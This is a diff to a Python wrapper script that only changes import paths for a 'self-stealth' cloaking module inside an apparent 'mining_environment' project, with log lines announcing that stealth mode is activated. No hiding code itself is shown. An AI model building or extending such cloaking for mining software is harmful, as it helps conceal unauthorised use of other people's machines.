@@ -30,9 +30,9 @@ from pathlib import Path
 project_root = Path(__file__).parent.parent.parent
 sys.path.insert(0, str(project_root))
 
-# Import self-stealth module
+# Import self-stealth module (updated path)
 try:
-    from mining_environment.cpu_plugins.cloaking_lib.self_stealth import start_self_stealth, SelfStealthManager
+    from mining_environment.stealth.core.self_stealth import start_self_stealth, SelfStealthManager
     from mining_environment.scripts.unified_logging import get_unified_logger
 except ImportError as e:
     print(f"❌ Failed to import required modules: {e}", file=sys.stderr)
@@ -48,7 +48,7 @@ def signal_handler(signum, frame):
     logger.info(f"🛑 [STEALTH-WRAPPER] Received signal {signum} - cleaning up stealth mode")
     
     # Get global stealth manager if exists
-    from mining_environment.cpu_plugins.cloaking_lib.self_stealth import get_global_stealth_manager
+    from mining_environment.stealth.core.self_stealth import get_global_stealth_manager
     stealth_manager = get_global_stealth_manager()
     
     if stealth_manager:
@@ -104,7 +104,7 @@ def main():
         )
         
         # Set global manager để signal handler có thể access
-        from mining_environment.cpu_plugins.cloaking_lib.self_stealth import set_global_stealth_manager
+        from mining_environment.stealth.core.self_stealth import set_global_stealth_manager
         set_global_stealth_manager(stealth_manager)
         
         logger.info("✅ [STEALTH-WRAPPER] Self-stealth mode activated")
